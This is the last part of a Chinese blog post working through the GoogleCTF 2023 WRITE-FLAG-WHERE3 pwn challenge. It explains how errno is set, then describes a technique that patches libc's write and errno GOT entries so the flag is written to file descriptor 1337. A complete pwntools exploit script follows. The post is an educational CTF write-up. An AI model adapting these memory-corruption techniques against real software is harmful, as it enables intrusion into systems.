<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fe254845679 &lt;on_exit+105&gt;    mov    eax, r12d</span><br><span class="line">  0x7fe25484567c &lt;on_exit+108&gt;    pop    rbx</span><br><span class="line">  0x7fe25484567d &lt;on_exit+109&gt;    pop    rbp</span><br><span class="line">  0x7fe25484567e &lt;on_exit+110&gt;    pop    r12</span><br><span class="line">  0x7fe254845680 &lt;on_exit+112&gt;    ret  </span><br></pre></td></tr></table></figure>

<h3 id="前置知识：errno的设置"><a href="#前置知识：errno的设置" class="headerlink" title="前置知识：errno的设置"></a>前置知识：errno的设置</h3><p>在系统调用执行过程中，如果出现错误，操作系统会设置全局变量 <code>errno</code> 来指示错误的类型。<code>errno</code> 是一个在 C 语言中定义的宏，它表示上一个函数调用发生的错误码。</p>
<p>当系统调用返回一个出错条件时，内核将特定的错误码设置到 <code>errno</code> 中。这个过程通常在底层系统库中完成，该库与操作系统内核进行交互。</p>
<p>具体的实现细节可能因操作系统和编程环境而异，但通常涉及以下步骤：</p>
<ol>
<li>系统调用执行时，内核会检查操作的合法性和可能发生的错误情况。</li>
<li>如果发现错误，内核会将相应的错误码存储在当前线程的内核数据结构中（如线程控制块或线程信息块）。</li>
<li>在系统调用返回时，系统库会将错误码从内核数据结构复制到用户空间中的 <code>errno</code> 全局变量。</li>
<li>用户程序可以通过检查 <code>errno</code> 的值来确定之前的系统调用是否成功执行。如果 <code>errno</code> 的值不为零，表示发生了错误，可以根据 <code>errno</code> 的值来进一步识别和处理具体的错误类型。</li>
</ol>
<h3 id="解题过程三"><a href="#解题过程三" class="headerlink" title="解题过程三"></a>解题过程三</h3><p>学习了一下EX师傅的解法，学习到了很多知识。</p>
<p>主要思路就是通过修改write函数的第一个参数，控制输出的位置，但是控制输出的位置需要我们的fs:18（这通常是指向当前线程的线程信息块（Thread Information Block，TIB）的指针。）不为0才能跳转到后面可以修改fd的代码区域</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000114A20 ; __unwind &#123;</span><br><span class="line">.text:0000000000114A20                 endbr64                 ; Alternative name is &#x27;__write&#x27;</span><br><span class="line">.text:0000000000114A24                 mov     eax, fs:18h</span><br><span class="line">.text:0000000000114A2C                 test    eax, eax</span><br><span class="line">.text:0000000000114A2E                 jnz     short loc_114A40</span><br><span class="line">.text:0000000000114A30                 mov     eax, 1</span><br><span class="line">.text:0000000000114A35                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000114A37                 cmp     rax, 0FFFFFFFFFFFFF000h</span><br><span class="line">.text:0000000000114A3D                 ja      short loc_114A90</span><br><span class="line">.text:0000000000114A3F                 retn</span><br><span class="line">.text:0000000000114A40 ; -----------------------------------------------------------------------</span><br><span class="line">.text:0000000000114A40</span><br><span class="line">.text:0000000000114A40 loc_114A40:                             ; CODE XREF: write+E↑j</span><br><span class="line">.text:0000000000114A40                 sub     rsp, 28h</span><br><span class="line">.text:0000000000114A44                 mov     [rsp+28h+count], rdx</span><br><span class="line">.text:0000000000114A49                 mov     [rsp+28h+buf], rsi</span><br><span class="line">.text:0000000000114A4E                 mov     dword ptr [rsp+28h+fd], edi</span><br><span class="line">.text:0000000000114A52                 call    sub_90A70</span><br><span class="line">.text:0000000000114A57                 mov     rdx, [rsp+28h+count] ; count</span><br><span class="line">.text:0000000000114A5C                 mov     rsi, [rsp+28h+buf] ; buf</span><br><span class="line">.text:0000000000114A61                 mov     r8d, eax</span><br><span class="line">.text:0000000000114A64                 mov     edi, dword ptr [rsp+28h+fd] ; fd</span><br><span class="line">.text:0000000000114A68                 mov     eax, 1</span><br><span class="line">.text:0000000000114A6D                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000114A6F                 cmp     rax, 0FFFFFFFFFFFFF000h</span><br><span class="line">.text:0000000000114A75                 ja      short loc_114AA8</span><br></pre></td></tr></table></figure>

<p>但是我们咋样才能控制fs:18不为0呢，我们无法直接控制fs:18,于是我们通过修改为fs:43去修改43位置的值即可，如何设置呢？通过errno的机制去设置，系统调用在出错设置errno时会根据errno在got里的值将出错码写入fabase+*errno_got的位置，于是我们修改errno在got表中的值为0x43就能修改fs:43的值。</p>
<p>然后就是去修改fd了</p>
<p>可以从上面的代码看出，我们需要去修改 </p>
<blockquote>
<p> .text:0000000000114A64                 mov     edi, dword ptr [rsp+28h+fd] ; fd</p>
</blockquote>
<p>去达到控制fd的目的。最后通过输入去控制对应位置的值为1337即可。</p>
<p>达到 write(1337, &amp;flag, n[0]);</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;wfw3.2023.ctfcompetition.com&#x27;, 1337)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">result = sh.recvuntil(<span class="string">b&#x27;.so&#x27;</span>).split(<span class="string">b&#x27;\n&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">libc_addr = <span class="built_in">int</span>(result[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\n\n\n&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span>-<span class="number">0x70</span>, <span class="number">0x78</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;0&#x27;</span>))</span><br><span class="line"><span class="comment">#修改errno的got的值为0</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;0&#x27;</span>))</span><br><span class="line"><span class="comment">#修改errno的got的值为0x43</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x115110</span>+<span class="number">1</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;0&#x27;</span>))</span><br><span class="line"><span class="comment">#修改close的系统调用为0x43，达到报错的目的去修改fs:*got_errno的目的</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A28</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;0&#x27;</span>))</span><br><span class="line"><span class="comment">#修改write函数从fs取得偏移</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A67</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;0&#x27;</span>))</span><br><span class="line"><span class="comment">#修改write  fd存放偏</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">0x227E60</span>+libc_addr))</span><br><span class="line">pause()</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (<span class="number">0</span>, <span class="number">0x70</span>)).encode().ljust(<span class="number">0x13</span>, <span class="string">b&#x27;0&#x27;</span>) + p32(<span class="number">1337</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/10/GoogleCTF2023%E5%A4%8D%E7%8E%B0/">http://example.com/2024/07/10/GoogleCTF2023%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/10/CISCN2023%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="CISCN2023初赛复现"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CISCN2023初赛复现</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/10/CISCN-PWN%E5%A4%8D%E7%8E%B0/" title="CISCN-PWN复现"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CISCN-PWN复现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">370</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">53</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GoogleCTF2023%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">GoogleCTF2023复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WRITE-FLAG-WHERE"><span class="toc-number">1.1.</span> <span class="toc-text">WRITE-FLAG-WHERE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips"><span class="toc-number">1.1.4.</span> <span class="toc-text">Tips</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WRITE-FLAG-WHERE2"><span class="toc-number">1.2.</span> <span class="toc-text">WRITE-FLAG-WHERE2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">Tips</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WRITE-FLAG-WHERE3"><span class="toc-number">1.3.</span> <span class="toc-text">WRITE-FLAG-WHERE3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%80"><span class="toc-number">1.3.2.</span> <span class="toc-text">解题过程一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9Ax64%E6%8C%87%E4%BB%A4%E5%89%8D%E7%BC%80"><span class="toc-number">1.3.4.</span> <span class="toc-text">前置知识：x64指令前缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%BA%8C"><span class="toc-number">1.3.5.</span> <span class="toc-text">解题过程二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">1.3.6.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9Aerrno%E7%9A%84%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.3.7.</span> <span class="toc-text">前置知识：errno的设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%89"><span class="toc-number">1.3.8.</span> <span class="toc-text">解题过程三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">1.3.9.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/BP%20%E8%AF%AF%E5%B7%AE%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E6%B3%95%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86%20-%20online/" title="BP 误差反向传播法数学知识 - online"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BP 误差反向传播法数学知识 - online"/></a><div class="content"><a class="title" href="/2024/07/10/BP%20%E8%AF%AF%E5%B7%AE%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E6%B3%95%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86%20-%20online/" title="BP 误差反向传播法数学知识 - online">BP 误差反向传播法数学知识 - online</a><time datetime="2024-07-10T07:41:47.045Z" title="发表于 2024-07-10 15:41:47">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%EF%BC%8C%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/" title="线程，进程，协程的区别"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="线程，进程，协程的区别"/></a><div class="content"><a class="title" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%EF%BC%8C%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/" title="线程，进程，协程的区别">线程，进程，协程的区别</a><time datetime="2024-07-10T04:04:54.315Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/" title="进程间的通信"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="进程间的通信"/></a><div class="content"><a class="title" href="/2024/07/10/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/" title="进程间的通信">进程间的通信</a><time datetime="2024-07-10T04:04:54.315Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/linux%E7%AE%A1%E9%81%93/" title="linux管道"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux管道"/></a><div class="content"><a class="title" href="/2024/07/10/linux%E7%AE%A1%E9%81%93/" title="linux管道">linux管道</a><time datetime="2024-07-10T04:04:54.314Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/" title="线程间的通信方式"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="线程间的通信方式"/></a><div class="content"><a class="title" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/" title="线程间的通信方式">线程间的通信方式</a><time datetime="2024-07-10T04:04:54.314Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 By C0KE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="C0KE,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>